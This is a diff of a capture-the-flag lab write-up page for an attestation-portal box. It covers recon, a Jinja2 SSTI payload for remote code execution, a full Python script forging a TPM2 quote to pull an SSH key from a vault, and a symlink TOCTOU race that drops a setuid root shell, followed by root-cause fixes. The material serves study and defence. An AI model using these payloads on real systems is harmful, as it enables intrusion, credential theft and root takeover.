@@ -67,51 +67,268 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>Target <code>10.48.177.211</code>, &quot;Keystone - Attestation Portal&quot; (Flask on nginx, port 80) plus SSH. The homepage describes an attestation-gated secret vault at <code>127.0.0.1:9000</code>, a software <button type="button" class="wu-gloss" data-def="Trusted Platform Module: a chip (or emulated component) that stores keys and attests to system state.">TPM</button> (<code>swtpm</code>) at <code>127.0.0.1:2321</code>, and a <code>/review?doc=&lt;name&gt;</code> document viewer. Docs leak that <code>/review</code> added a risky Jinja2 render, and that the vault &quot;treats the client-supplied AK as trusted after signature verification only&quot; - plus the vault source path, the AK TPM handle, and the <code>measure-and-run</code> sudo helper (relevant to the Root stage).</p>
-<p><strong>SSTI → RCE:</strong> path traversal on <code>doc</code> is blocked, but the value renders through Jinja2 and is echoed on the error page: <code>{{7*7}}</code> → <code>49</code> confirms it; <code>os</code> is reachable through <code>cycler</code>&#39;s globals:</p>
-<figure class="wu-code" data-lines="3">
+<h2 id="tldr"><a class="wu-anchor" href="#tldr" aria-hidden="true">#</a>TL;DR</h2>
+<ol>
+<li><strong>Jinja2 SSTI</strong> in the <code>/review?doc=</code> parameter → RCE as <code>webapp</code>.</li>
+<li>The internal <button type="button" class="wu-gloss" data-def="Trusted Platform Module: a chip (or emulated component) that stores keys and attests to system state.">TPM</button> &quot;vault&quot; verifies a quote signature against a <strong>client-supplied</strong> attestation key and never binds it to the real TPM&#39;s endorsement key (EK) - a deliberate missing <em>credential activation</em> step. Forge a TPM2 quote with your own RSA key → vault releases <strong>tpm-admin&#39;s SSH private key</strong> → <code>user.txt</code>.</li>
+<li><code>measure-and-run</code> (sudo, NOPASSWD) has a <strong>TOCTOU double-open race</strong>: it hashes a path, then re-opens the <em>same path</em> 20 ms later to <code>fexecve</code> it. Swap a symlink from an allowlisted binary to a payload during the window → code execution as <strong>root</strong> → <code>root.txt</code>.</li>
+</ol>
+<hr>
+<h2 id="1-recon"><a class="wu-anchor" href="#1-recon" aria-hidden="true">#</a>1. Recon</h2>
+<figure class="wu-code" data-lines="1">
       <figcaption>
         
         <span class="wu-code-lang">bash</span>
         <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -sG http://10.48.177.211/review \</span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  --data-urlencode <span class="hljs-string">&quot;doc={{cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()}}&quot;</span></span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)</span></span></span></code></pre>
+      <pre id="code-1"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">nmap -Pn -n -sV -sC -p- 10.48.177.211</span></span></code></pre>
       
-    </figure><p>RCE as <code>webapp</code> (member of the <code>tpm</code> group), giving access to the Go vault source and the attestation protocol internals.</p>
-<p><strong>Forging the attestation (VAULT-114):</strong> <code>/opt/vault/main.go</code> implements <code>POST /attest</code> → <code>POST /verify</code> → <code>GET /secret</code>. <code>/verify</code> checks the quote signature against <strong>the AK pubkey the client itself supplied in <code>/attest</code></strong>, validates the <code>TPMS_ATTEST</code> magic/type/nonce, and pins PCR0/1/7 digest to an all-zero golden state - but never performs <strong>credential activation</strong> (<code>TPM2_MakeCredential</code>/<code>ActivateCredential</code>) to bind that client-supplied AK to the real hardware/software TPM&#39;s endorsement key. So any RSA key can be presented as the AK.</p>
-<figure class="wu-code" data-lines="9">
+    </figure><p>Only two ports open:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>OpenSSH 9.2p1 (Debian 12)</td>
+</tr>
+<tr>
+<td>80</td>
+<td>nginx 1.22.1 → &quot;Keystone - Attestation Portal&quot; (Flask)</td>
+</tr>
+</tbody></table>
+<p>The homepage describes an attestation-gated secret vault:</p>
+<ul>
+<li>Internal vault at <code>127.0.0.1:9000</code> that &quot;only releases secrets to attested clients&quot;.</li>
+<li>A software TPM (<code>swtpm</code>) socket on <code>127.0.0.1:2321</code>.</li>
+<li>A <code>/review?doc=&lt;name&gt;</code> document viewer with links to <code>welcome</code>, <code>changelog</code>, <code>operators</code>, <code>deprecation</code>.</li>
+</ul>
+<h3 id="key-leaks-from-the-docs"><a class="wu-anchor" href="#key-leaks-from-the-docs" aria-hidden="true">#</a>Key leaks from the docs</h3>
+<ul>
+<li><strong>changelog:</strong> <em>&quot;2026-10-02 … added <strong>Jinja2 render on /review</strong>. Risk accepted - docs are trusted.&quot;</em> and <em>&quot;vault is treating the client-supplied AK as trusted after signature verification only.&quot;</em></li>
+<li><strong>operators:</strong> vault source is at <code>/opt/vault/main.go</code>; AK persisted at TPM handle <code>0x81000001</code>; <code>measure-and-run</code> is a sudo helper that extends <strong>PCR 23</strong> before running a measured binary; allowlist at <code>/etc/measure/allowed-hashes.txt</code> owned by <code>tpm-admin</code>.</li>
+</ul>
+<hr>
+<h2 id="2-ssti-rce-user-webapp"><a class="wu-anchor" href="#2-ssti-rce-user-webapp" aria-hidden="true">#</a>2. SSTI → RCE (user <code>webapp</code>)</h2>
+<p>Path traversal on <code>doc</code> was blocked (&quot;no such document&quot;), but the value is rendered through Jinja2, and the &quot;no such document&quot; page echoes it back:</p>
+<figure class="wu-code" data-lines="2">
       <figcaption>
         
-        <span class="wu-code-lang">python</span>
+        <span class="wu-code-lang">bash</span>
         <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">priv = rsa.generate_private_key(...)                  <span class="hljs-comment"># our own &quot;AK&quot;</span></span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">a = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/attest&quot;</span>, json={<span class="hljs-string">&quot;ak_pub_pem&quot;</span>: pub_pem}).json()</span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">buf  = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0xFF544347</span>)                   <span class="hljs-comment"># TPM_GENERATED_VALUE</span></span></span>
-<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">buf += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-number">0x8018</span>)                       <span class="hljs-comment"># TPM_ST_ATTEST_QUOTE</span></span></span>
-<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">buf += blob16(<span class="hljs-string">b&quot;&quot;</span>) + blob16(nonce) + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">17</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span></span></span>
-<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">buf += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0</span>) + blob16(expected_digest)  <span class="hljs-comment"># pcrDigest pinned to zero</span></span></span>
-<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">sig = priv.sign(buf, padding.PKCS1v15(), hashes.SHA256())</span></span>
-<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">tok = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/verify&quot;</span>, json={...}).json()[<span class="hljs-string">&quot;token&quot;</span>]</span></span>
-<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/secret&quot;</span>, params={<span class="hljs-string">&quot;token&quot;</span>: tok}).json()[<span class="hljs-string">&quot;payload&quot;</span>]</span></span></code></pre>
+      <pre id="code-2"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -sG http://10.48.177.211/review --data-urlencode <span class="hljs-string">&quot;doc={{7*7}}&quot;</span>      <span class="hljs-comment"># -&gt; 49</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">curl -sG http://10.48.177.211/review --data-urlencode <span class="hljs-string">&quot;doc={{7*&#x27;7&#x27;}}&quot;</span>    <span class="hljs-comment"># -&gt; 7777777</span></span></span></code></pre>
       
-    </figure><p>The vault releases <strong>tpm-admin&#39;s SSH private key</strong>.</p>
+    </figure><p>Confirmed SSTI. <code>os</code> is reachable through <code>cycler</code>&#39;s globals, giving RCE:</p>
 <figure class="wu-code" data-lines="3">
       <figcaption>
         
         <span class="wu-code-lang">bash</span>
         <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">ssh -i tpm-admin.key tpm-admin@10.48.177.211</span></span>
-<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-built_in">cat</span> /home/tpm-admin/user.txt</span></span>
-<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># isfcr{tr0st_but_v3rify_the_endors3ment}</span></span></span></code></pre>
+      <pre id="code-3"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">curl -sG http://10.48.177.211/review \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  --data-urlencode <span class="hljs-string">&quot;doc={{cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read()}}&quot;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)</span></span></span></code></pre>
       
-    </figure><p>Root cause: the vault verified a signature but never verified the <strong>endorsement</strong> (EK) behind the key - exactly the flag&#39;s &quot;trust but verify the endorsement.&quot;</p>
+    </figure><p>Running as <code>webapp</code> (host <code>keystone</code>, cwd <code>/opt/webapp</code>), a member of the <code>tpm</code> group.</p>
+<blockquote>
+<p>A small base64 wrapper made command execution reliable (the Flask dev server is single-threaded and occasionally stalls). Larger files were staged by hosting them over HTTP on the VPN interface and <code>curl</code>-ing them from the target, since long SSTI URLs get truncated.</p>
+</blockquote>
+<h3 id="target-layout"><a class="wu-anchor" href="#target-layout" aria-hidden="true">#</a>Target layout</h3>
+<ul>
+<li><code>/opt/webapp/portal.py</code> - the Flask portal (our RCE context).</li>
+<li><code>/opt/vault/{main.go,vault,README.md}</code> - the Go vault (readable).</li>
+<li><code>/etc/keystone/</code> - <code>README.md</code>, <code>ak.pub</code>, <code>sealed.txt</code> (not readable as <code>webapp</code>).</li>
+<li><strong>User flag:</strong> <code>/home/tpm-admin/user.txt</code> (<code>-rw-r----- tpm-admin:tpm-admin</code>) - need to be <code>tpm-admin</code>.</li>
+</ul>
+<hr>
+<h2 id="3-forging-the-tpm-attestation-tpm-admin"><a class="wu-anchor" href="#3-forging-the-tpm-attestation-tpm-admin" aria-hidden="true">#</a>3. Forging the TPM attestation → tpm-admin</h2>
+<h3 id="the-vulnerability-vault-114"><a class="wu-anchor" href="#the-vulnerability-vault-114" aria-hidden="true">#</a>The vulnerability (VAULT-114)</h3>
+<p><code>/opt/vault/main.go</code> implements a 3-step attestation protocol on <code>127.0.0.1:9000</code>:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">POST /attest  {ak_pub_pem}          -&gt; {session, nonce, expected_pcrs, expected_digest}
+POST /verify  {session, quote_msg, quote_sig} -&gt; {token}
+GET  /secret?token=...              -&gt; {payload}</code></pre>
+      
+    </figure><p><code>/verify</code> checks:</p>
+<ol>
+<li><code>quote_sig</code> verifies (RSA PKCS#1 v1.5 / SHA-256) against the <strong>AK pubkey the client sent to <code>/attest</code></strong>,</li>
+<li>parsed <code>TPMS_ATTEST</code> magic == <code>TPM_GENERATED_VALUE</code> (<code>0xFF544347</code>),</li>
+<li>type == <code>TPM_ST_ATTEST_QUOTE</code> (<code>0x8018</code>),</li>
+<li><code>extraData</code> == <code>nonce</code>,</li>
+<li><code>pcrDigest</code> == <code>SHA256(pcr0 || pcr1 || pcr7)</code>, with all three pinned to <strong>all-zero</strong> (software-TPM golden state).</li>
+</ol>
+<p>The comment and README say it plainly: there is <strong>no credential activation</strong> (<code>TPM2_MakeCredential</code> / <code>ActivateCredential</code>) binding the client AK to the system EK. So an attacker can present <em>any</em> RSA key, sign a <em>forged</em> <code>TPMS_ATTEST</code> that references the expected (zero) PCR values, and the vault accepts it.</p>
+<h3 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h3>
+<p>Since the vault only listens on localhost, the exploit runs on the target (via the SSTI RCE). <code>cryptography</code> and <code>requests</code> are available on the box.</p>
+<figure class="wu-code is-collapsible" data-lines="38">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> struct, base64, binascii, requests</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> rsa, padding</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> hashes, serialization</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">BASE = <span class="hljs-string">&quot;http://127.0.0.1:9000&quot;</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc"><span class="hljs-comment"># 1) our own &quot;AK&quot;</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">priv = rsa.generate_private_key(public_exponent=<span class="hljs-number">65537</span>, key_size=<span class="hljs-number">2048</span>)</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">pub_pem = priv.public_key().public_bytes(</span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()</span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc"><span class="hljs-comment"># 2) /attest</span></span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">a = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/attest&quot;</span>, json={<span class="hljs-string">&quot;ak_pub_pem&quot;</span>: pub_pem}).json()</span></span>
+<span class="wu-line" data-line="14"><span class="wu-ln">14</span><span class="wu-lc">nonce           = binascii.unhexlify(a[<span class="hljs-string">&quot;nonce&quot;</span>])</span></span>
+<span class="wu-line" data-line="15"><span class="wu-ln">15</span><span class="wu-lc">expected_digest = binascii.unhexlify(a[<span class="hljs-string">&quot;expected_digest&quot;</span>])</span></span>
+<span class="wu-line" data-line="16"><span class="wu-ln">16</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="17"><span class="wu-ln">17</span><span class="wu-lc"><span class="hljs-comment"># 3) craft TPMS_ATTEST (ATTEST_QUOTE). Parser accepts pcrSelect.count = 0.</span></span></span>
+<span class="wu-line" data-line="18"><span class="wu-ln">18</span><span class="wu-lc"><span class="hljs-keyword">def</span> <span class="hljs-title function_">blob16</span>(<span class="hljs-params">b</span>): <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(b)) + b</span></span>
+<span class="wu-line" data-line="19"><span class="wu-ln">19</span><span class="wu-lc">buf  = struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0xFF544347</span>)   <span class="hljs-comment"># magic  TPM_GENERATED_VALUE</span></span></span>
+<span class="wu-line" data-line="20"><span class="wu-ln">20</span><span class="wu-lc">buf += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-number">0x8018</span>)       <span class="hljs-comment"># type   TPM_ST_ATTEST_QUOTE</span></span></span>
+<span class="wu-line" data-line="21"><span class="wu-ln">21</span><span class="wu-lc">buf += blob16(<span class="hljs-string">b&quot;&quot;</span>)                     <span class="hljs-comment"># qualifiedSigner (empty TPM2B_NAME)</span></span></span>
+<span class="wu-line" data-line="22"><span class="wu-ln">22</span><span class="wu-lc">buf += blob16(nonce)                   <span class="hljs-comment"># extraData = nonce</span></span></span>
+<span class="wu-line" data-line="23"><span class="wu-ln">23</span><span class="wu-lc">buf += <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">17</span>                      <span class="hljs-comment"># TPMS_CLOCK_INFO</span></span></span>
+<span class="wu-line" data-line="24"><span class="wu-ln">24</span><span class="wu-lc">buf += <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>                       <span class="hljs-comment"># firmwareVersion</span></span></span>
+<span class="wu-line" data-line="25"><span class="wu-ln">25</span><span class="wu-lc">buf += struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, <span class="hljs-number">0</span>)            <span class="hljs-comment"># TPML_PCR_SELECTION count = 0</span></span></span>
+<span class="wu-line" data-line="26"><span class="wu-ln">26</span><span class="wu-lc">buf += blob16(expected_digest)         <span class="hljs-comment"># pcrDigest</span></span></span>
+<span class="wu-line" data-line="27"><span class="wu-ln">27</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="28"><span class="wu-ln">28</span><span class="wu-lc"><span class="hljs-comment"># 4) sign SHA256(buf) with our key</span></span></span>
+<span class="wu-line" data-line="29"><span class="wu-ln">29</span><span class="wu-lc">sig = priv.sign(buf, padding.PKCS1v15(), hashes.SHA256())</span></span>
+<span class="wu-line" data-line="30"><span class="wu-ln">30</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="31"><span class="wu-ln">31</span><span class="wu-lc"><span class="hljs-comment"># 5) /verify -&gt; token</span></span></span>
+<span class="wu-line" data-line="32"><span class="wu-ln">32</span><span class="wu-lc">tok = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/verify&quot;</span>, json={</span></span>
+<span class="wu-line" data-line="33"><span class="wu-ln">33</span><span class="wu-lc">    <span class="hljs-string">&quot;session&quot;</span>: a[<span class="hljs-string">&quot;session&quot;</span>],</span></span>
+<span class="wu-line" data-line="34"><span class="wu-ln">34</span><span class="wu-lc">    <span class="hljs-string">&quot;quote_msg&quot;</span>: base64.b64encode(buf).decode(),</span></span>
+<span class="wu-line" data-line="35"><span class="wu-ln">35</span><span class="wu-lc">    <span class="hljs-string">&quot;quote_sig&quot;</span>: base64.b64encode(sig).decode()}).json()[<span class="hljs-string">&quot;token&quot;</span>]</span></span>
+<span class="wu-line" data-line="36"><span class="wu-ln">36</span><span class="wu-lc"></span></span>
+<span class="wu-line" data-line="37"><span class="wu-ln">37</span><span class="wu-lc"><span class="hljs-comment"># 6) /secret -&gt; sealed payload</span></span></span>
+<span class="wu-line" data-line="38"><span class="wu-ln">38</span><span class="wu-lc"><span class="hljs-built_in">print</span>(requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">{BASE}</span>/secret&quot;</span>, params={<span class="hljs-string">&quot;token&quot;</span>: tok}).json()[<span class="hljs-string">&quot;payload&quot;</span>])</span></span></code></pre>
+      <button type="button" class="wu-code-more" aria-expanded="false" data-more="+26 lines" data-less="show less">+26 lines</button>
+    </figure><p>The vault released the <strong>tpm-admin SSH private key</strong> (ed25519). Save it and log in:</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">chmod</span> 600 tpm-admin.key</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">ssh -i tpm-admin.key tpm-admin@10.48.177.211</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-built_in">cat</span> /home/tpm-admin/user.txt</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-comment"># isfcr{tr0st_but_v3rify_the_endors3ment}</span></span></span></code></pre>
+      
+    </figure><hr>
+<h2 id="4-toctou-race-in-measure-and-run-root"><a class="wu-anchor" href="#4-toctou-race-in-measure-and-run-root" aria-hidden="true">#</a>4. TOCTOU race in <code>measure-and-run</code> → root</h2>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-text">$ sudo -l
+(root) NOPASSWD: /usr/sbin/measure-and-run *</code></pre>
+      
+    </figure><p>The <code>~/race</code> directory was pre-staged with the intended exploit primitives:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">safe            # copy of /bin/true  (sha256 c79bf442... -&gt; ON the allowlist)
+evil            # bash payload: cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
+link -&gt; evil    # symlink we will flip</code></pre>
+      
+    </figure><h3 id="the-bug"><a class="wu-anchor" href="#the-bug" aria-hidden="true">#</a>The bug</h3>
+<p>Decompiling <code>/usr/sbin/measure-and-run</code> (a setuid-invoked helper) reveals:</p>
+<ol>
+<li><code>open(argv[1])</code> → <code>mmap</code> + <code>SHA256</code> the <strong>contents</strong> of that path.</li>
+<li><code>tpm2_pcrextend 23:sha256=&lt;hash&gt;</code> (extend PCR 23).</li>
+<li>Read <code>/etc/measure/allowed-hashes.txt</code>; <code>strcmp</code> the hash against each line.</li>
+<li>On match: print <code>&quot;policy ok, launching...&quot;</code>, <strong><code>usleep(20000)</code></strong> (20 ms), then</li>
+<li><strong><code>open(argv[1])</code> <em>again</em> by path</strong> → <code>fexecve()</code>.</li>
+</ol>
+<p>Steps 1 and 5 open the <strong>same path twice</strong>, with a fixed 20 ms sleep in between - a textbook time-of-check / time-of-use race. If the path is a symlink pointing at <code>safe</code> during the hash/allowlist check but at <code>evil</code> during the re-open, the <strong>allowlisted hash is approved</strong> yet <strong>the payload is executed as root</strong>.</p>
+<h3 id="winning-the-race"><a class="wu-anchor" href="#winning-the-race" aria-hidden="true">#</a>Winning the race</h3>
+<p>Run <code>measure-and-run</code> repeatedly against the symlink while a tight loop flips <code>link</code> between <code>safe</code> and <code>evil</code>:</p>
+<figure class="wu-code" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cd</span> /home/tpm-admin/race</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">( <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ln</span> -sfn evil <span class="hljs-built_in">link</span>; <span class="hljs-built_in">ln</span> -sfn safe <span class="hljs-built_in">link</span>; <span class="hljs-keyword">done</span> ) &amp;   <span class="hljs-comment"># toggler</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 4000); <span class="hljs-keyword">do</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">  <span class="hljs-built_in">sudo</span> /usr/sbin/measure-and-run /home/tpm-admin/race/link &gt;/dev/null 2&gt;&amp;1</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">  [ -u /tmp/rootbash ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;WON after <span class="hljs-variable">$i</span>&quot;</span>; <span class="hljs-built_in">break</span>; }</span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc"><span class="hljs-keyword">done</span></span></span></code></pre>
+      
+    </figure><ul>
+<li>hash=<code>safe</code>, reopen=<code>evil</code> → <strong>win</strong> (payload runs as root)</li>
+<li>hash=<code>evil</code> → hash not on allowlist, aborts harmlessly</li>
+<li>both=<code>safe</code> → runs <code>/bin/true</code>, harmless</li>
+</ul>
+<p>Won after <strong>10 attempts</strong>. A setuid-root bash was dropped:</p>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">ls</span> -l /tmp/rootbash          <span class="hljs-comment"># -rwsr-xr-x root root</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">/tmp/rootbash -p -c <span class="hljs-string">&#x27;id; cat /root/root.txt&#x27;</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># uid=1003(tpm-admin) euid=0(root)</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-comment"># isfcr{a_pcr_is_a_promise_not_proof}</span></span></span></code></pre>
+      
+    </figure><hr>
+<h2 id="root-cause-summary"><a class="wu-anchor" href="#root-cause-summary" aria-hidden="true">#</a>Root cause summary</h2>
+<table>
+<thead>
+<tr>
+<th>Stage</th>
+<th>Flaw</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Portal</td>
+<td>Untrusted input rendered through Jinja2 (<code>/review?doc=</code>)</td>
+<td>Never template user input; use <code>render_template</code> with context, or a static whitelist</td>
+</tr>
+<tr>
+<td>Vault</td>
+<td>Attestation accepts a client-supplied AK with no EK binding (no MakeCredential/ActivateCredential)</td>
+<td>Bind the AK to the platform EK via credential activation before trusting a quote</td>
+</tr>
+<tr>
+<td>measure-and-run</td>
+<td>TOCTOU: hashes a path, then re-opens it by path to exec</td>
+<td>Open once, verify and <code>fexecve</code> the <strong>same fd</strong> (never re-resolve the path); drop the sleep</td>
+</tr>
+</tbody></table>
+<h2 id="themes-behind-the-flag-text"><a class="wu-anchor" href="#themes-behind-the-flag-text" aria-hidden="true">#</a>Themes behind the flag text</h2>
+<ul>
+<li>**User - ** <em>&quot;trust but verify the endorsement&quot;</em>: the vault verified a signature but never verified the <strong>endorsement</strong> (EK) behind the key.</li>
+<li>**Root - ** <em>&quot;a PCR is a promise not proof&quot;</em>: extending/checking a PCR value proves nothing about what actually runs after the measurement when the file can be swapped.</li>
+</ul>
 
     </article>
-    
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#tldr">TL;DR</a></li><li><a href="#1-recon">1. Recon</a><ol class="wu-toc-sub"><li><a href="#key-leaks-from-the-docs">Key leaks from the docs</a></li></ol></li><li><a href="#2-ssti-rce-user-webapp">2. SSTI → RCE (user webapp)</a><ol class="wu-toc-sub"><li><a href="#target-layout">Target layout</a></li></ol></li><li><a href="#3-forging-the-tpm-attestation-tpm-admin">3. Forging the TPM attestation → tpm-admin</a><ol class="wu-toc-sub"><li><a href="#the-vulnerability-vault-114">The vulnerability (VAULT-114)</a></li><li><a href="#exploit">Exploit</a></li></ol></li><li><a href="#4-toctou-race-in-measure-and-run-root">4. TOCTOU race in measure-and-run → root</a><ol class="wu-toc-sub"><li><a href="#the-bug">The bug</a></li><li><a href="#winning-the-race">Winning the race</a></li></ol></li><li><a href="#root-cause-summary">Root cause summary</a></li><li><a href="#themes-behind-the-flag-text">Themes behind the flag text</a></li></ol>
+      </nav>
   </div>
 
   <nav class="wu-pager" aria-label="More writeups">
